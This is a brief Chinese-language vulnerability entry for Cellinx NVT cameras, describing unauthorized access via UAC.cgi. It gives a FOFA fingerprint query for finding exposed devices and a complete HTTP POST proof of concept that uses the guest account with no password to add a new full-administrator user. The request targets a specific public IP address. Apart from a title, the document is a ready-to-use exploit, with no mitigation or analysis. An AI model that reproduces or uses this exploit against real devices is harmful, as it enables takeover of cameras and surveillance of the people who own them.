# Cellinx NVT 摄像机 UAC.cgi 未授权访问漏洞

    ## fofa

```
body="local/NVT-string.js"
```

## poc

```
POST /cgi-bin/UAC.cgi?TYPE=json HTTP/1.1
Host: 1.222.228.4
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/json; charset=UTF-8
Accept-Encoding: gzip
Content-Length: 198

{"jsonData":{"username":"guest","password":"","option":"add_user","data":{"username":"testadm1n3","password":"testtest","permission":{"is_admin":"1","view":"1","ptz":"1","setting":"1","dout":"1"}}}}
```
